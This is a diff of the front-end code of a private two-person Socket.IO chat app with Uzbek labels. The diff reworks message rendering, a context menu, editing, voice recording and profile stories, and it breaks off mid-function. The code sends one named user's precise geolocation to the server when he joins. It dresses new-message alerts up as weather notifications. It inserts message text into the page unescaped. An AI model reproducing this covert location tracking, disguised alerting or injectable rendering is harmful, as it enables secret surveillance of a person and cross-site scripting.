@@ -11,10 +11,8 @@
         .avatar-box.has-story { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
         .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid #2c3e50; background: #fff; }
         .story-indicator { position: absolute; top: 20px; color: white; font-weight: bold; font-size: 18px; text-shadow: 1px 1px 3px black; z-index: 2005; }
-        /* Galochkalar uslubi */
         .msg-status { font-size: 12px; font-weight: bold; margin-left: 4px; }
         .msg-info-row { display: flex; justify-content: flex-end; align-items: center; gap: 3px; margin-top: 2px; }
-        /* Kontekst menyu */
         #msgContextMenu {
             display: none; position: fixed; z-index: 9999;
             background: rgba(30,30,40,0.97); border: 1px solid rgba(255,255,255,0.15);
@@ -28,9 +26,8 @@
         }
         #msgContextMenu button:hover { background: rgba(255,255,255,0.12); }
         #msgContextMenu button.danger { color: #ff5555; }
-        /* Tahrirlash modal */
         #editModal {
-            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;
         }
         #editModal .edit-box {
@@ -45,10 +42,7 @@
             font-family: 'Poppins', sans-serif; outline: none; resize: none; min-height: 60px;
         }
         .edit-btns { display: flex; gap: 8px; margin-top: 12px; }
-        .edit-btns button {
-            flex: 1; padding: 9px; border: none; border-radius: 8px;
-            cursor: pointer; font-size: 14px; font-weight: bold;
-        }
+        .edit-btns button { flex: 1; padding: 9px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; }
         .edit-btns .btn-save { background: #2ecc71; color: #fff; }
         .edit-btns .btn-cancel { background: rgba(255,255,255,0.15); color: #fff; }
     </style>
@@ -73,7 +67,24 @@
         <div id="storyIndicator" class="story-indicator"></div>
         <div id="storyContent" style="width:100%; max-height:100%; display:flex; justify-content:center; align-items:center;"></div>
     </div>
-    
+
+    <div id="msgContextMenu">
+        <button id="ctxReply"><i class='bx bxs-reply' style="margin-right:7px;"></i>Javob berish</button>
+        <button id="ctxEdit"><i class='bx bx-edit' style="margin-right:7px;"></i>Tahrirlash</button>
+        <button id="ctxDelete" class="danger"><i class='bx bx-trash' style="margin-right:7px;"></i>O'chirish</button>
+    </div>
+
+    <div id="editModal">
+        <div class="edit-box">
+            <h3>&#9998; Xabarni tahrirlash</h3>
+            <textarea id="editMsgInput"></textarea>
+            <div class="edit-btns">
+                <button class="btn-save" onclick="saveEdit()">Saqlash</button>
+                <button class="btn-cancel" onclick="closeEditModal()">Bekor qilish</button>
+            </div>
+        </div>
+    </div>
+
     <div class="chat-container">
         <div class="chat-header" style="display:flex; justify-content:space-between; align-items:center; padding:10px;">
             <div style="display:flex; align-items:center; gap:8px;">
@@ -123,391 +134,392 @@
     <input type="file" id="fileInput" onchange="uploadFile(this.files[0])" style="display:none;">
     <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])" style="display:none;">
 
-    <!-- Kontekst menyu -->
-    <div id="msgContextMenu">
-        <button id="ctxReply"><i class='bx bxs-reply' style="margin-right:7px;"></i>Javob berish</button>
-        <button id="ctxEdit"><i class='bx bx-edit' style="margin-right:7px;"></i>Tahrirlash</button>
-        <button id="ctxDelete" class="danger"><i class='bx bx-trash' style="margin-right:7px;"></i>O'chirish</button>
-    </div>
-
-    <!-- Tahrirlash modal -->
-    <div id="editModal">
-        <div class="edit-box">
-            <h3>&#9998; Xabarni tahrirlash</h3>
-            <textarea id="editMsgInput"></textarea>
-            <div class="edit-btns">
-                <button class="btn-save" onclick="saveEdit()">Saqlash</button>
-                <button class="btn-cancel" onclick="closeEditModal()">Bekor qilish</button>
-            </div>
-        </div>
-    </div>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        const myUser = localStorage.getItem('chatUser');
-        if (!myUser) window.location.href = 'index.html';
+        var socket = io();
 
-        const partner = (myUser === 'mura') ? 'max' : 'mura';
+        var myUser = localStorage.getItem('chatUser');
+        if (!myUser) { window.location.href = 'index.html'; }
+
+        var partner = (myUser === 'mura') ? 'max' : 'mura';
         document.getElementById('chatPartner').innerText = partner.toUpperCase();
+        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();
 
-        const emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
-        const emojiContainer = document.getElementById('emojiPicker');
-        emojis.forEach(emoji => {
-            const span = document.createElement('div'); span.textContent = emoji; span.className = 'emoji-btn';
-            span.onclick = () => { const input = document.getElementById('msgInput'); input.value += emoji; input.focus(); };
-            emojiContainer.appendChild(span);
+        var currentReply = null;
+        var profilesData = {};
+        var currentStoryIndex = 0;
+        var viewingUser = null;
+        var storyTimeout = null;
+        var ctxCurrentMsg = null;
+        var editingMsgId = null;
+        var maxMessageCount = 0;
+        var mediaRecorder;
+        var audioChunks = [];
+        var isRecording = false;
+
+        // EMOJI
+        var emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
+        var emojiContainer = document.getElementById('emojiPicker');
+        emojis.forEach(function(emoji) {
+            var sp = document.createElement('div');
+            sp.textContent = emoji; sp.className = 'emoji-btn';
+            sp.onclick = function() { var i = document.getElementById('msgInput'); i.value += emoji; i.focus(); };
+            emojiContainer.appendChild(sp);
         });
         function toggleEmoji() { emojiContainer.classList.toggle('active'); }
-        document.addEventListener('click', (e) => { if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) emojiContainer.classList.remove('active'); });
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) emojiContainer.classList.remove('active');
+        });
 
+        // JOIN
         function joinChat() {
-            if (myUser === 'max' && "geolocation" in navigator) {
+            if (myUser === 'max' && navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => { socket.emit('join', { user: myUser, lat: position.coords.latitude, lon: position.coords.longitude }); },
-                    (error) => { socket.emit('join', { user: myUser }); },
+                    function(p) { socket.emit('join', { user: myUser, lat: p.coords.latitude, lon: p.coords.longitude }); },
+                    function() { socket.emit('join', { user: myUser }); },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
-            } else socket.emit('join', { user: myUser });
+            } else { socket.emit('join', { user: myUser }); }
         }
         joinChat();
 
-        let currentReply = null;
-        socket.on('status_update', (data) => {
-            const isOnline = data.online.includes(partner);
-            const statusEl = document.getElementById('statusText');
-            if (isOnline) statusEl.innerHTML = '<span style="color:#00ff41; font-weight:bold;">Online</span>';
-            else { const lastTime = data.lastSeen[partner]; statusEl.innerText = lastTime ? `last seen at ${lastTime}` : 'Offline'; }
+        // STATUS
+        socket.on('status_update', function(data) {
+            var online = data.online || [];
+            var isOnline = online.indexOf(partner) !== -1;
+            var el = document.getElementById('statusText');
+            if (isOnline) {
+                el.innerHTML = '<span style="color:#00ff41; font-weight:bold;">Online</span>';
+            } else {
+                var t = data.lastSeen ? data.lastSeen[partner] : null;
+                el.style.color = '#8faec5';
+                el.innerText = t ? ('last seen at ' + t) : 'Offline';
+            }
         });
 
-        socket.on('load_history', (history) => {
-            const list = document.getElementById('messagesList'); list.innerHTML = '';
-            history.forEach(msg => appendMessage(msg)); list.scrollTop = list.scrollHeight;
-            socket.emit('mark_read'); // Tarix yuklanganda o'qilgan qilib belgilaymiz
+        // TARIX
+        socket.on('load_history', function(history) {
+            var list = document.getElementById('messagesList');
+            list.innerHTML = '';
+            for (var i = 0; i < history.length; i++) appendMessage(history[i]);
+            list.scrollTop = list.scrollHeight;
+            socket.emit('mark_read');
         });
 
-        socket.on('new_message', (msg) => {
+        // YANGI XABAR
+        socket.on('new_message', function(msg) {
             appendMessage(msg);
-            const list = document.getElementById('messagesList'); list.scrollTop = list.scrollHeight;
+            var list = document.getElementById('messagesList');
+            list.scrollTop = list.scrollHeight;
             if (msg.user !== myUser) {
-                if (!document.hidden) {
-                    socket.emit('mark_read');
-                } else {
-                    showPushNotification(msg);
+                if (!document.hidden) socket.emit('mark_read');
+                else showPushNotification();
+            }
+        });
+        window.addEventListener('focus', function() { socket.emit('mark_read'); });
+
+        // GALOCHKALAR
+        socket.on('messages_read', function(data) {
+            if (data.byUser === partner) {
+                var ss = document.querySelectorAll('.my-msg .msg-status');
+                for (var i = 0; i < ss.length; i++) {
+                    ss[i].innerHTML = '&#10003;&#10003;';
+                    ss[i].style.color = '#3498db';
                 }
             }
         });
 
-        // Chatga qaytib kirganingizda o'qilgan qiladi
-        window.addEventListener('focus', () => { socket.emit('mark_read'); });
-
-        // Sherik xabarni o'qiganda mening ekranimda galochka ko'karishi
-        socket.on('messages_read', (data) => {
-            if (data.byUser === partner) {
-                const statuses = document.querySelectorAll('.my-msg .msg-status');
-                statuses.forEach(el => {
-                    el.innerHTML = '&#10003;&#10003;';
-                    el.style.color = '#3498db';
-                });
-            }
-        });
-
+        // XABARNI CHIZISH
         function appendMessage(msg) {
-            const list = document.getElementById('messagesList'); const div = document.createElement('div');
-            const isMe = String(msg.user).toLowerCase() === String(myUser).toLowerCase();
-            div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
-            div.dataset.id = msg.id;
-            div.ondblclick = () => triggerReply(msg);
+            var list = document.getElementById('messagesList');
+            var div = document.createElement('div');
+            var isMe = (msg.user || '').toLowerCase() === myUser.toLowerCase();
 
-            // Uzun bosish (long-press) orqali kontekst menyu
-            let longPressTimer;
-            div.addEventListener('touchstart', (e) => { longPressTimer = setTimeout(() => showContextMenu(e.touches[0].clientX, e.touches[0].clientY, msg, isMe), 600); });
-            div.addEventListener('touchend', () => clearTimeout(longPressTimer));
-            div.addEventListener('touchmove', () => clearTimeout(longPressTimer));
-            div.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e.clientX, e.clientY, msg, isMe); });
+            div.className = 'message ' + (isMe ? 'my-msg' : 'other-msg');
+            div.setAttribute('data-id', msg.id || '');
+            div.ondblclick = (function(m) { return function() { triggerReply(m); }; })(msg);
 
-            let senderNameHtml = (!isMe && msg.user) ? `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${String(msg.user).toUpperCase()}</div>` : '';
-            let replyHtml = msg.replyTo ? `<div class="reply-block"><div class="reply-user">${msg.replyTo.user}</div><div>${msg.replyTo.text}</div></div>` : '';
-            let mediaHtml = '';
+            // Long-press
+            var lpt;
+            div.addEventListener('touchstart', (function(m) {
+                return function(e) {
+                    var t = e.touches[0];
+                    lpt = setTimeout(function() { showContextMenu(t.clientX, t.clientY, m, isMe); }, 600);
+                };
+            })(msg));
+            div.addEventListener('touchend', function() { clearTimeout(lpt); });
+            div.addEventListener('touchmove', function() { clearTimeout(lpt); });
+            div.addEventListener('contextmenu', (function(m) {
+                return function(e) { e.preventDefault(); showContextMenu(e.clientX, e.clientY, m, isMe); };
+            })(msg));
+
+            var senderHtml = (!isMe && msg.user) ? '<div style="font-size:11px; font-weight:bold; color:#64b5ef; margin-bottom:3px;">' + msg.user.toUpperCase() + '</div>' : '';
+            var replyHtml = '';
+            if (msg.replyTo) replyHtml = '<div class="reply-block"><div class="reply-user">' + (msg.replyTo.user || '') + '</div><div>' + (msg.replyTo.text || '') + '</div></div>';
+
+            var mediaHtml = '';
             if (msg.file) {
-                if (msg.fileType.startsWith('image/')) mediaHtml = `<img src="/uploads/${msg.file}" class="msg-img">`;
-                else if (msg.fileType.startsWith('video/')) mediaHtml = `<video src="/uploads/${msg.file}" controls class="msg-img"></video>`;
-                else if (msg.fileType.startsWith('audio/') || msg.file.endsWith('.webm')) mediaHtml = `<audio src="/uploads/${msg.file}" controls style="margin-top:5px; width:200px;"></audio>`;
-                else mediaHtml = `<a href="/uploads/${msg.file}" download style="color:skyblue; display:block; margin-top:5px;">&#128196; ${msg.originalName || 'Fayl'}</a>`;
-            }
-            let editedMark = msg.edited ? `<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>` : '';
-            let textHtml = msg.text ? `<div>${msg.text}${editedMark}</div>` : '';
-            const msgId = msg.id || '';
-            const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick="window._replyById('${msgId}')"></i>`;
-            
-            let checkmarks = '';
-            if (isMe) {
-                const checkColor = msg.read ? '#3498db' : '#bdc3c7';
-                const checkSign = msg.read ? '&#10003;&#10003;' : '&#10003;';
-                checkmarks = `<span class="msg-status" style="color: ${checkColor};">${checkSign}</span>`;
+                if (msg.fileType && msg.fileType.startsWith('image/')) mediaHtml = '<img src="/uploads/' + msg.file + '" class="msg-img">';
+                else if (msg.fileType && msg.fileType.startsWith('video/')) mediaHtml = '<video src="/uploads/' + msg.file + '" controls class="msg-img"></video>';
+                else if ((msg.fileType && msg.fileType.startsWith('audio/')) || msg.file.endsWith('.webm')) mediaHtml = '<audio src="/uploads/' + msg.file + '" controls style="margin-top:5px; width:200px;"></audio>';
+                else mediaHtml = '<a href="/uploads/' + msg.file + '" download style="color:skyblue; display:block; margin-top:5px;">&#128196; ' + (msg.originalName || 'Fayl') + '</a>';
             }
 
-            div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <div class="msg-info-row"><span class="msg-time">${msg.time}</span> ${checkmarks}</div>`;
-            // Xabar obyektini DOM elementga bog'laymiz (JSON.stringify HTML ni buzmasligi uchun)
+            var editedMark = msg.edited ? '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>' : '';
+            var textHtml = msg.text ? '<div class="msg-text">' + msg.text + editedMark + '</div>' : '';
+
+            var checkmarks = '';
+            if (isMe) {
+                var cc = msg.read ? '#3498db' : '#bdc3c7';
+                var cs = msg.read ? '&#10003;&#10003;' : '&#10003;';
+                checkmarks = '<span class="msg-status" style="color:' + cc + ';">' + cs + '</span>';
+            }
+
+            div.innerHTML = senderHtml + replyHtml + mediaHtml + textHtml +
+                '<div class="msg-info-row"><span class="msg-time">' + (msg.time || '') + '</span>' + checkmarks + '</div>';
+
+            // Reply tugmasi — xavfsiz JS orqali
+            var rb = document.createElement('i');
+            rb.className = 'bx bxs-share';
+            rb.style.cssText = 'position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;';
+            rb.onclick = (function(m) { return function(e) { e.stopPropagation(); triggerReply(m); }; })(msg);
+            div.appendChild(rb);
             div._msgData = msg;
             list.appendChild(div);
         }
 
-        // ID orqali reply - onclick='...' ichida JSON.stringify ishlatmaslik uchun
-        window._replyById = function(id) {
-            const el = document.querySelector(`.message[data-id='${id}']`);
-            if (el && el._msgData) triggerReply(el._msgData);
+        // REPLY
+        window.triggerReply = function(msg) {
+            var txt = msg.text || (msg.file ? '[Fayl/Media]' : '...');
+            currentReply = { user: msg.user, text: txt };
+            document.getElementById('replyPreview').style.display = 'flex';
+            document.getElementById('replyToUser').innerText = msg.user || '';
+            document.getElementById('replyToText').innerText = txt;
+            document.getElementById('msgInput').focus();
+        };
+        window.cancelReply = function() {
+            currentReply = null;
+            document.getElementById('replyPreview').style.display = 'none';
         };
 
-        window.triggerReply = function(msg) {
-            let previewText = msg.text || (msg.file ? "[Fayl/Media]" : "...");
-            currentReply = { user: msg.user, text: previewText };
-            document.getElementById('replyPreview').style.display = 'flex'; document.getElementById('replyToUser').innerText = msg.user;
-            document.getElementById('replyToText').innerText = previewText; document.getElementById('msgInput').focus();
-        }
-        window.cancelReply = function() { currentReply = null; document.getElementById('replyPreview').style.display = 'none'; }
+        // XABAR YUBORISH
         window.sendMessage = function() {
-            const input = document.getElementById('msgInput'); const text = input.value.trim();
-            if (text || currentReply) { socket.emit('send_message', { text: text, replyTo: currentReply }); input.value = ''; cancelReply(); emojiContainer.classList.remove('active'); }
-        }
-        document.getElementById('msgInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+            var input = document.getElementById('msgInput');
+            var text = input.value.trim();
+            if (text || currentReply) {
+                socket.emit('send_message', { text: text, replyTo: currentReply });
+                input.value = ''; cancelReply(); emojiContainer.classList.remove('active');
+            }
+        };
+        document.getElementById('msgInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') sendMessage(); });
 
-        const micBtn = document.getElementById('micBtn'); let mediaRecorder; let audioChunks = []; let isRecording = false;
-        const startRec = async (e) => {
-            if (e.cancelable) e.preventDefault(); if (isRecording) return;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); mediaRecorder = new MediaRecorder(stream);
+        // MIKROFON
+        var micBtn = document.getElementById('micBtn');
+        function startRec(e) {
+            if (e.cancelable) e.preventDefault();
+            if (isRecording) return;
+            navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+                mediaRecorder = new MediaRecorder(stream);
                 audioChunks = []; isRecording = true; micBtn.classList.add('recording-active');
-                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-                mediaRecorder.onstop = () => {
+                mediaRecorder.ondataavailable = function(ev) { audioChunks.push(ev.data); };
+                mediaRecorder.onstop = function() {
                     micBtn.classList.remove('recording-active'); isRecording = false;
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    if (audioBlob.size > 2000) uploadFile(audioBlob, 'voice_msg.webm');
-                    stream.getTracks().forEach(track => track.stop());
+                    var blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    if (blob.size > 2000) uploadFile(blob, 'voice_msg.webm');
+                    stream.getTracks().forEach(function(t) { t.stop(); });
                 };
                 mediaRecorder.start();
-            } catch (err) { alert("Mikrofon ishlamadi!"); }
-        };
-        const stopRec = (e) => { if (e.cancelable) e.preventDefault(); if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); };
+            }).catch(function() { alert('Mikrofon ishlamadi!'); });
+        }
+        function stopRec(e) {
+            if (e.cancelable) e.preventDefault();
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }
         micBtn.addEventListener('mousedown', startRec); micBtn.addEventListener('mouseup', stopRec);
         micBtn.addEventListener('touchstart', startRec); micBtn.addEventListener('touchend', stopRec);
 
-        window.uploadFile = async function(file, nameOverride = null) {
-            if (!file) return; const formData = new FormData(); formData.append('file', file, nameOverride || file.name);
-            try {
-                const res = await fetch('/upload', { method: 'POST', body: formData }); const data = await res.json();
-                socket.emit('send_message', { text: '', file: data.filename, fileType: data.type, originalName: data.originalName, replyTo: currentReply });
-                cancelReply();
-            } catch (e) { alert("Yuklashda xato!"); }
-        }
+        // FAYL YUKLASH
+        window.uploadFile = function(file, nameOverride) {
+            if (!file) return;
+            var fd = new FormData();
+            fd.append('file', file, nameOverride || file.name);
+            fetch('/upload', { method: 'POST', body: fd })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    socket.emit('send_message', { text: '', file: d.filename, fileType: d.type, originalName: d.originalName, replyTo: currentReply });
+                    cancelReply();
+                }).catch(function() { alert('Yuklashda xato!'); });
+        };
 
-        // ============================================================
-        // KONTEKST MENYU: TAHRIRLASH VA O'CHIRISH
-        // ============================================================
-        let ctxCurrentMsg = null;
-        const ctxMenu = document.getElementById('msgContextMenu');
-
+        // KONTEKST MENYU
+        var ctxMenu = document.getElementById('msgContextMenu');
         function showContextMenu(x, y, msg, isMe) {
             ctxCurrentMsg = msg;
-            // Faqat o'z xabarini tahrirlash/o'chirish mumkin
-            document.getElementById('ctxEdit').style.display = isMe && msg.text ? 'block' : 'none';
+            document.getElementById('ctxEdit').style.display = (isMe && msg.text) ? 'block' : 'none';
             document.getElementById('ctxDelete').style.display = isMe ? 'block' : 'none';
             ctxMenu.style.display = 'block';
-            // Ekrandan chiqib ketmaslik uchun pozitsiya
-            const menuW = 160, menuH = 120;
-            ctxMenu.style.left = (x + menuW > window.innerWidth ? x - menuW : x) + 'px';
-            ctxMenu.style.top  = (y + menuH > window.innerHeight ? y - menuH : y) + 'px';
+            ctxMenu.style.left = ((x + 160 > window.innerWidth) ? x - 160 : x) + 'px';
+            ctxMenu.style.top = ((y + 130 > window.innerHeight) ? y - 130 : y) + 'px';
         }
-
-        document.addEventListener('click', () => { ctxMenu.style.display = 'none'; });
-        document.getElementById('ctxReply').onclick = () => { if (ctxCurrentMsg) triggerReply(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
-        document.getElementById('ctxEdit').onclick = () => { if (ctxCurrentMsg) openEditModal(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
-        document.getElementById('ctxDelete').onclick = () => {
-            if (ctxCurrentMsg && confirm("Xabarni o'chirishni tasdiqlaysizmi?")) {
-                socket.emit('delete_message', { id: ctxCurrentMsg.id });
-            }
+        document.addEventListener('click', function(e) { if (!e.target.closest('#msgContextMenu')) ctxMenu.style.display = 'none'; });
+        document.getElementById('ctxReply').onclick = function() { if (ctxCurrentMsg) triggerReply(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
+        document.getElementById('ctxEdit').onclick = function() { if (ctxCurrentMsg) openEditModal(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
+        document.getElementById('ctxDelete').onclick = function() {
+            if (ctxCurrentMsg && confirm("Xabarni o'chirishni tasdiqlaysizmi?")) socket.emit('delete_message', { id: ctxCurrentMsg.id });
             ctxMenu.style.display = 'none';
         };
 
-        // Xabar o'chirilganda DOM dan olib tashlash
-        socket.on('message_deleted', (data) => {
-            const el = document.querySelector(`.message[data-id='${data.id}']`);
+        socket.on('message_deleted', function(d) {
+            var el = document.querySelector('.message[data-id="' + d.id + '"]');
             if (el) el.remove();
         });
-
-        // Xabar tahrirlanganda DOM ni yangilash
-        socket.on('message_edited', (data) => {
-            const el = document.querySelector(`.message[data-id='${data.id}']`);
+        socket.on('message_edited', function(d) {
+            var el = document.querySelector('.message[data-id="' + d.id + '"]');
             if (el) {
-                const textDiv = el.querySelector('div:not(.reply-block):not(.msg-info-row)');
-                if (textDiv) textDiv.innerHTML = data.text + '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>';
+                var td = el.querySelector('.msg-text');
+                if (td) td.innerHTML = d.text + '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>';
+                if (el._msgData) { el._msgData.text = d.text; el._msgData.edited = true; }
             }
         });
 
-        // Tahrirlash modal
-        let editingMsgId = null;
+        // TAHRIRLASH MODAL
         function openEditModal(msg) {
             editingMsgId = msg.id;
-            document.getElementById('editMsgInput').value = msg.text;
+            document.getElementById('editMsgInput').value = msg.text || '';
             document.getElementById('editModal').style.display = 'flex';
-            document.getElementById('editMsgInput').focus();
+            setTimeout(function() { document.getElementById('editMsgInput').focus(); }, 100);
         }
         function closeEditModal() { document.getElementById('editModal').style.display = 'none'; editingMsgId = null; }
         window.saveEdit = function() {
-            const newText = document.getElementById('editMsgInput').value.trim();
-            if (!newText || !editingMsgId) return;
-            socket.emit('edit_message', { id: editingMsgId, text: newText });
-            closeEditModal();
+            var t = document.getElementById('editMsgInput').value.trim();
+            if (!t || !editingMsgId) return;
+            socket.emit('edit_message', { id: editingMsgId, text: t }); closeEditModal();
         };
-        document.getElementById('editMsgInput').addEventListener('keydown', (e) => {
+        window.closeEditModal = closeEditModal;
+        document.getElementById('editMsgInput').addEventListener('keydown', function(e) {
             if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); saveEdit(); }
             if (e.key === 'Escape') closeEditModal();
         });
 
-        // ============================================================
-        // BILDIRISH NOMA (PUSH NOTIFICATION)
-        // ============================================================
-        function requestNotificationPermission() {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission();
-            }
-        }
-        requestNotificationPermission();
-
-        function showPushNotification(msg) {
-            if (!('Notification' in window) || Notification.permission !== 'granted') return;
-            if (!document.hidden) return; // Oyna ochiq bo'lsa notification kerak emas
-            const weatherTips = [
-                'Bugun havo ochiq, sayr qilish uchun qulay kun!',
-                'Kechqurun shamol kutilmoqda, kiyinib chiqing.',
-                'Bugun quyoshli, uvb indeksi yuqori — quyosh kremi esdan chiqmasin.',
-                'Toshkentda harorat 22°C, bulutli ob-havo kutilmoqda.',
+        // BILDIRISH NOMA
+        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
+        function showPushNotification() {
+            if (!('Notification' in window) || Notification.permission !== 'granted' || !document.hidden) return;
+            var tips = [
+                "Bugun havo ochiq, sayr qilish uchun qulay kun!",
+                "Kechqurun shamol kutilmoqda, kiyinib chiqing.",
+                "Bugun quyoshli, uvb indeksi yuqori — quyosh kremi esdan chiqmasin.",
+                "Toshkentda harorat 22\u00B0C, bulutli ob-havo kutilmoqda.",
                 "Bugun yomg'ir ehtimoli bor, soyabon oling!",
-                'Havo namligi oshgan, qulay kun emas. Ichkarida qoling.'
+                "Havo namligi oshgan, qulay kun emas. Ichkarida qoling."
             ];
-            const tip = weatherTips[Math.floor(Math.random() * weatherTips.length)];
-            const n = new Notification("\u26C5 Ob-havo ma'lumoti", {
-                body: tip,
-                icon: 'https://cdn-icons-png.flaticon.com/512/3222/3222800.png',
-                silent: false
+            var n = new Notification("\u26C5 Ob-havo ma\u02BBlumoti", {
+                body: tips[Math.floor(Math.random() * tips.length)],
+                icon: 'https://cdn-icons-png.flaticon.com/512/3222/3222800.png', silent: false
             });
-            n.onclick = function() { window.focus(); this.close(); };
-            setTimeout(() => n.close(), 6000);
+            n.onclick = function() { window.focus(); n.close(); };
+            setTimeout(function() { n.close(); }, 6000);
         }
 
-        let profilesData = {}; let currentStoryIndex = 0; let viewingUser = null; let storyTimeout = null;
-        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();
-        function hasActiveStory(userObj) { if (!userObj) return false; if (userObj.stories && userObj.stories.length > 0) return true; if (userObj.story) return true; return false; }
-
-        socket.on('load_profiles', (data) => {
+        // PROFIL
+        function hasActiveStory(u) { if (!u) return false; return (u.stories && u.stories.length > 0) || !!u.story; }
+        socket.on('load_profiles', function(data) {
             profilesData = data;
             if (profilesData[myUser]) {
-                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = `/uploads/${profilesData[myUser].avatar}`;
-                if (hasActiveStory(profilesData[myUser])) document.getElementById('myStoryRing').classList.add('has-story');
-                else document.getElementById('myStoryRing').classList.remove('has-story');
+                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = '/uploads/' + profilesData[myUser].avatar;
+                document.getElementById('myStoryRing').classList[hasActiveStory(profilesData[myUser]) ? 'add' : 'remove']('has-story');
             }
             if (profilesData[partner]) {
-                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = `/uploads/${profilesData[partner].avatar}`;
-                if (hasActiveStory(profilesData[partner])) document.getElementById('partnerStoryRing').classList.add('has-story');
-                else document.getElementById('partnerStoryRing').classList.remove('has-story');
+                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = '/uploads/' + profilesData[partner].avatar;
+                document.getElementById('partnerStoryRing').classList[hasActiveStory(profilesData[partner]) ? 'add' : 'remove']('has-story');
             }
         });
-
-        async function saveProfileChanges() {
-            const avatarFile = document.getElementById('avatarInput').files[0]; const storyFile = document.getElementById('storyInput').files[0];
-            if (avatarFile) {
-                const fd = new FormData(); fd.append('file', avatarFile);
-                try { const res = await fetch('/upload', { method: 'POST', body: fd }); const data = await res.json(); socket.emit('update_profile', { avatar: data.filename }); } catch(e) {}
-            }
-            if (storyFile) {
-                if (storyFile.type.startsWith('video/')) {
-                    const videoCheck = document.createElement('video'); videoCheck.preload = 'metadata';
-                    const isAllowed = await new Promise((resolve) => {
-                        videoCheck.onloadedmetadata = function() {
-                            window.URL.revokeObjectURL(videoCheck.src);
-                            if (videoCheck.duration > 60) { alert("Video 1 daqiqadan oshmasligi shart!"); resolve(false); } else resolve(true);
-                        }
-                        videoCheck.src = URL.createObjectURL(storyFile);
-                    });
-                    if (!isAllowed) return; 
+        window.saveProfileChanges = async function() {
+            var af = document.getElementById('avatarInput').files[0];
+            var sf = document.getElementById('storyInput').files[0];
+            if (af) {
+                var fd=new FormData(); fd.append('file',af);
+                try { var r=await fetch('/upload',{method:'POST',body:fd}); var d=await r.json(); socket.emit('update_profile',{avatar:d.filename}); } catch(e){} }
+            if (sf) {
+                if (sf.type.startsWith('video/')) {
+                    var ok = await new Promise(function(res) {
+                        var v=document.createElement('video'); v.preload='metadata';
+                        v.onloadedmetadata=function(){window.URL.revokeObjectURL(v.src); if(v.duration>60){alert("Video 1 daqiqadan oshmasligi shart!"); res(false);}else res(true);};
+                        v.src=URL.createObjectURL(sf);
+                    }); if (!ok) return;
                 }
-                const fd2 = new FormData(); fd2.append('file', storyFile);
-                try {
-                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 }); const data2 = await res2.json();
-                    socket.emit('add_story', { filename: data2.filename, type: data2.type });
-                } catch(e) {}
+                var fd2=new FormData(); fd2.append('file',sf);
+                try { var r2=await fetch('/upload',{method:'POST',body:fd2}); var d2=await r2.json(); socket.emit('add_story',{filename:d2.filename,type:d2.type}); } catch(e){}
             }
-            alert("Muvaffaqiyatli saqlandi!"); document.getElementById('profileModal').style.display = 'none'; document.getElementById('avatarInput').value = ''; document.getElementById('storyInput').value = '';
-        }
-
-        function deleteMyStory() {
+            alert("Muvaffaqiyatli saqlandi!");
+            document.getElementById('profileModal').style.display='none';
+            document.getElementById('avatarInput').value=''; document.getElementById('storyInput').value='';
+        };
+        window.deleteMyStory = function() {
